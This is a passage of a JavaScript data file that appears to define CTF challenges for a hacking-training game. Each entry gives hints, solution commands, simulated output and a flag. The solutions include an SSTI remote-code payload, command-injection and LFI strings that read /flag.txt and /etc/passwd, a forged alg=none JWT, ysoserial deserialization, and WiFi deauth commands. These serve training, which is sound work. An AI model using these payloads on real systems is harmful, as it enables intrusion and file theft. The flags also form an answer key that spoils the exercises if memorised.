      simulatedResponse: '--- XXE Injection ---\n\n[*] Sending malicious XML payload...\n[*] Server parsed the external entity!\n\nResponse:\nroot:x:0:0:root:/root:/bin/bash\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nflag_user:x:1000:1000:CTF{xxe_1nj3ct10n}:/home/flag:/bin/bash\n\nFlag: CTF{xxe_1nj3ct10n}',
      flag: 'CTF{xxe_1nj3ct10n}',
      successMessage: '📄 XXE injection exploited!'
    },
    {
      id: 'ctf-90', title: 'SSTI Attack', difficulty: 'expert', xp: 100,
      description: 'Exploit a Server-Side Template Injection in a Jinja2 template engine.',
      objective: 'Exploit template engines for RCE.',
      hints: ['Try {{7*7}} in input fields.', 'Jinja2: {{config}} or {{request.application.__globals__}}'],
      solutions: ['curl "http://target.local/profile?name={{7*7}}"', 'curl "http://target.local/profile?name={{config}}"'],
      simulatedResponse: '--- SSTI Exploitation ---\n\n$ curl "http://target.local/profile?name={{7*7}}"\nHello 49!  ← Template injection confirmed!\n\n$ curl "http://target.local/profile?name={{request.application.__globals__.__builtins__.__import__(\'os\').popen(\'cat /flag.txt\').read()}}"\n\nHello CTF{sst1_t3mpl4t3}!\n\nFlag: CTF{sst1_t3mpl4t3}',
      flag: 'CTF{sst1_t3mpl4t3}',
      successMessage: '🧩 Template injection exploited!'
    },
    {
      id: 'ctf-91', title: 'Deserialization', difficulty: 'expert', xp: 100,
      description: 'Exploit an insecure deserialization vulnerability in a Java application.',
      objective: 'Exploit unsafe object deserialization.',
      hints: ['Java deserialization can lead to RCE.', 'Use ysoserial to generate payloads.'],
      solutions: ['java -jar ysoserial.jar CommonsCollections1 "cat /flag.txt" | base64', 'curl -X POST -H "Content-Type: application/x-java-serialized-object" --data-binary @payload.bin http://target.local/api'],
      simulatedResponse: '--- Deserialization Exploit ---\n\n[*] Generating payload with ysoserial...\n[*] Using CommonsCollections1 gadget chain\n[*] Command: cat /flag.txt\n\n[*] Sending serialized payload to /api endpoint...\n[*] Server deserialized our malicious object!\n[*] Command executed!\n\nOutput: CTF{d3s3r14l1z4t10n}\n\nFlag: CTF{d3s3r14l1z4t10n}',
      flag: 'CTF{d3s3r14l1z4t10n}',
      successMessage: '💊 Deserialization exploited!'
    },
    {
      id: 'ctf-92', title: 'AWS S3 Bucket', difficulty: 'expert', xp: 100,
      description: 'Enumerate and access a misconfigured public S3 bucket "ctf-challenge-bucket".',
      objective: 'Exploit cloud storage misconfigurations.',
      hints: ['aws s3 ls lists bucket contents.', 'Public buckets can be accessed without auth.'],
      solutions: ['aws s3 ls s3://ctf-challenge-bucket --no-sign-request', 'curl https://ctf-challenge-bucket.s3.amazonaws.com/'],
      simulatedResponse: '--- S3 Bucket Enumeration ---\n\n$ aws s3 ls s3://ctf-challenge-bucket --no-sign-request\n\n2026-01-01 00:00:00       1234 index.html\n2026-01-01 00:00:00        567 config.json\n2026-01-01 00:00:00         28 flag.txt\n2026-01-01 00:00:00      89012 backup.sql\n\n$ aws s3 cp s3://ctf-challenge-bucket/flag.txt - --no-sign-request\nCTF{s3_buck3t_l34k}\n\nFlag: CTF{s3_buck3t_l34k}',
      flag: 'CTF{s3_buck3t_l34k}',
      successMessage: '☁️ S3 bucket exploited!'
    },
    {
      id: 'ctf-93', title: 'JWT Exploitation', difficulty: 'expert', xp: 100,
      description: 'Exploit a JWT (JSON Web Token) by changing the algorithm to "none" to forge admin access.',
      objective: 'Bypass JWT authentication.',
      hints: ['JWT has three parts: header.payload.signature', 'Change "alg" to "none" and remove signature.'],
      solutions: ['curl -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJyb2xlIjoiYWRtaW4ifQ." http://target.local/admin'],
      simulatedResponse: '--- JWT Exploitation ---\n\n[*] Original JWT:\nHeader: {"alg":"HS256","typ":"JWT"}\nPayload: {"role":"user"}\n\n[*] Forged JWT (alg=none):\nHeader: {"alg":"none","typ":"JWT"}\nPayload: {"role":"admin"}\n\n$ curl -H "Authorization: Bearer [forged_token]" http://target.local/admin\n\n{"status":"success","message":"Welcome, admin!","flag":"CTF{jwt_f0rg3ry}"}\n\nFlag: CTF{jwt_f0rg3ry}',
      flag: 'CTF{jwt_f0rg3ry}',
      successMessage: '🎫 JWT forged!'
    },
    {
      id: 'ctf-94', title: 'Command Injection', difficulty: 'expert', xp: 100,
      description: 'Exploit a command injection vulnerability in a web app\'s ping function.',
      objective: 'Inject OS commands through web inputs.',
      hints: ['Try: 127.0.0.1; cat /flag.txt', 'Semicolons, pipes, and backticks can break out.'],
      solutions: ['curl "http://target.local/ping?ip=127.0.0.1;cat /flag.txt"', 'curl "http://target.local/ping?ip=127.0.0.1|cat+/flag.txt"'],
      simulatedResponse: '--- Command Injection ---\n\n$ curl "http://target.local/ping?ip=127.0.0.1; cat /flag.txt"\n\nPING 127.0.0.1: 1 packets transmitted, 1 received\n\nCTF{cmd_1nj3ct10n}\n\nFlag: CTF{cmd_1nj3ct10n}',
      flag: 'CTF{cmd_1nj3ct10n}',
      successMessage: '💉 Command injected!'
    },
    {
      id: 'ctf-95', title: 'LFI Attack', difficulty: 'expert', xp: 100,
      description: 'Exploit a Local File Inclusion vulnerability to read /etc/passwd.',
      objective: 'Read server files through LFI.',
      hints: ['LFI includes local files.', 'Try: ?page=../../../../etc/passwd'],
      solutions: ['curl "http://target.local/page.php?page=../../../../etc/passwd"', 'curl "http://target.local/page.php?page=....//....//....//etc/passwd"'],
      simulatedResponse: '--- LFI Exploitation ---\n\n$ curl "http://target.local/page.php?page=../../../../etc/passwd"\n\nroot:x:0:0:root:/root:/bin/bash\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nctf_flag:x:1337:1337:CTF{lf1_4tt4ck}:/dev/null:/bin/false\n\nFlag: CTF{lf1_4tt4ck}',
      flag: 'CTF{lf1_4tt4ck}',
      successMessage: '📂 LFI exploited!'
    },
    {
      id: 'ctf-96', title: 'DNS Rebinding', difficulty: 'expert', xp: 100,
      description: 'Exploit a DNS rebinding attack to bypass same-origin policy and access internal services.',
      objective: 'Understand DNS rebinding attacks.',
      hints: ['DNS rebinding changes IP resolution.', 'First resolve to attacker, then to internal IP.'],
      solutions: ['dig rebind.attacker.com', 'nslookup rebind.attacker.com'],
      simulatedResponse: '--- DNS Rebinding Attack ---\n\n[*] Setting up DNS rebinding service...\n[*] First query: rebind.attacker.com → 1.2.3.4 (attacker)\n[*] Second query: rebind.attacker.com → 127.0.0.1 (internal)\n\n[*] Browser fetches from 1.2.3.4 (loads attacker JS)\n[*] Browser fetches from 127.0.0.1 (same domain, bypasses SOP!)\n\n[*] Internal service accessed!\n[*] Response: {"secret": "CTF{dns_r3b1nd1ng}"}\n\nFlag: CTF{dns_r3b1nd1ng}',
      flag: 'CTF{dns_r3b1nd1ng}',
      successMessage: '🔄 DNS rebinding successful!'
    },
    {
      id: 'ctf-97', title: 'Wireless Deauth', difficulty: 'expert', xp: 100,
      description: 'Simulate a WiFi deauthentication attack to capture a WPA handshake.',
      objective: 'Understand wireless security attacks.',
      hints: ['aireplay-ng sends deauth frames.', 'airodump-ng captures handshakes.'],
      solutions: ['aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon', 'airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon'],
      simulatedResponse: '--- WiFi Deauth Attack (Simulated) ---\n\n$ airodump-ng wlan0mon\n\n BSSID              CH  ENC   ESSID\n AA:BB:CC:DD:EE:FF   6  WPA2  CTF_Network\n\n$ aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon\n[*] Sending 5 deauthentication frames...\n[*] Client disconnected!\n\n$ airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon\n[*] WPA handshake captured!\n\n$ aircrack-ng capture.cap -w wordlist.txt\nKEY FOUND! [ CTF{w1f1_d34uth} ]\n\nFlag: CTF{w1f1_d34uth}',
      flag: 'CTF{w1f1_d34uth}',
      successMessage: '📶 WiFi handshake captured!'
    },
    {
      id: 'ctf-98', title: 'Binary RE', difficulty: 'expert', xp: 100,
      description: 'Reverse engineer a binary "crackme" to find the hardcoded flag.',
      objective: 'Basic binary reverse engineering.',
      hints: ['strings extracts readable text.', 'objdump or gdb can disassemble.'],
      solutions: ['strings crackme', 'strings crackme | grep CTF', 'objdump -d crackme'],
      simulatedResponse: '--- Binary Reverse Engineering ---\n\n$ strings crackme | grep CTF\n(no results)\n\n$ objdump -d crackme | grep -A5 "compare"\n  4011a0: cmp $0x43,%al     # \'C\'\n  4011a4: cmp $0x54,%al     # \'T\'\n  4011a8: cmp $0x46,%al     # \'F\'\n\n[*] Reconstructing from assembly...\n[*] Flag characters: C-T-F-{-r-3-v-3-r-s-3-d-}\n\nFlag: CTF{r3v3rs3d}',
      flag: 'CTF{r3v3rs3d}',
      successMessage: '🔬 Binary reversed!'
    },
    {
      id: 'ctf-99', title: 'Steganography', difficulty: 'expert', xp: 100,
      description: 'Extract a hidden message from an image file using steganography techniques.',
      objective: 'Detect and extract hidden data in images.',
      hints: ['steghide or binwalk can extract hidden data.', 'steghide extract -sf image.jpg'],
      solutions: ['steghide extract -sf image.jpg', 'binwalk image.jpg', 'strings image.jpg | grep CTF'],
      simulatedResponse: '--- Steganography Analysis ---\n\n$ steghide extract -sf image.jpg\nEnter passphrase: (empty)\n\nwrote extracted data to "hidden.txt"\n\n$ cat hidden.txt\n=== TOP SECRET ===\nThe flag is: CTF{st3g4n0gr4phy}\nThis message was hidden inside the image.\n\nFlag: CTF{st3g4n0gr4phy}',
      flag: 'CTF{st3g4n0gr4phy}',
      successMessage: '🖼️ Hidden message extracted!'
    },
    {
      id: 'ctf-100', title: 'The Ultimate CTF', difficulty: 'expert', xp: 200,
      description: 'FINAL BOSS: Chain every skill you have learned. Reconnaissance, exploitation, privilege escalation, and data exfiltration. You are the elite hacker.',
      objective: 'Complete the ultimate multi-stage CTF challenge.',
      hints: ['Start with recon: nmap, dig, whois.', 'Exploit, escalate, exfiltrate.'],
      solutions: ['nmap -sV 10.13.37.100', 'ping 10.13.37.100', 'curl http://10.13.37.100'],
      simulatedResponse: '╔══════════════════════════════════════════════════════╗\n║           🏆 THE ULTIMATE CTF CHALLENGE 🏆           ║\n╚══════════════════════════════════════════════════════╝\n\n══ Stage 1: Reconnaissance ══\n→ nmap -sV 10.13.37.100: SSH(22), HTTP(80), MySQL(3306)\n→ dig target.ctf: Internal DNS reveals admin.target.ctf\n\n══ Stage 2: Initial Access ══\n→ SQL Injection on login page\n→ Gained www-data shell\n\n══ Stage 3: Privilege Escalation ══\n→ Found SUID binary: /usr/local/bin/backup\n→ PATH hijacking → root shell\n\n══ Stage 4: Data Exfiltration ══\n→ cat /root/ultimate_flag.txt\n\n🎊🎊🎊 CONGRATULATIONS! 🎊🎊🎊\n\nYou have completed ALL 100 CTF challenges!\n\n╔══════════════════════════════════════════════════════╗\n║  Flag: CTF{ult1m4t3_h4ck3r_l3g3nd}                  ║\n║  Title: Cybersecurity Grandmaster                    ║\n║  Rank: ★★★★★★ LEGENDARY                             ║\n║  Challenges Completed: 100/100                       ║\n╚══════════════════════════════════════════════════════╝',
      flag: 'CTF{ult1m4t3_h4ck3r_l3g3nd}',
      successMessage: '🏆🏆🏆 ULTIMATE CTF LEGEND! All 100 challenges conquered! You are a Cybersecurity Grandmaster! 🏆🏆🏆'
    }
  ]
};

// Difficulty metadata
const DIFFICULTY_CONFIG = {
  easy: { label: 'Easy', color: '#00ff41', icon: '🟢', xpMultiplier: 1 },
  medium: { label: 'Medium', color: '#ffaa00', icon: '🟡', xpMultiplier: 2 },
  hard: { label: 'Hard', color: '#ff4444', icon: '🔴', xpMultiplier: 3 },
  expert: { label: 'Expert', color: '#ff00ff', icon: '💀', xpMultiplier: 5 }
};

// Category metadata
const CATEGORY_CONFIG = {
  command: {
    label: 'Command Challenge',
    icon: '⌨️',
    color: '#00ff41',
    description: 'Master Linux commands by solving progressively harder challenges.',
    terminalPrompt: 'cmd'
  },
  bandit: {
    label: 'Bandit Challenge',
    icon: '🔓',
    color: '#00d4ff',
    description: 'Find hidden passwords and keys to advance through each level.',
    terminalPrompt: 'bandit'
  },
  ctf: {
    label: 'CTF Challenge',
    icon: '🚩',
    color: '#ff00ff',
    description: 'Capture the Flag! Use ping and network tools to find hidden flags.',
    terminalPrompt: 'ctf'
  }
};
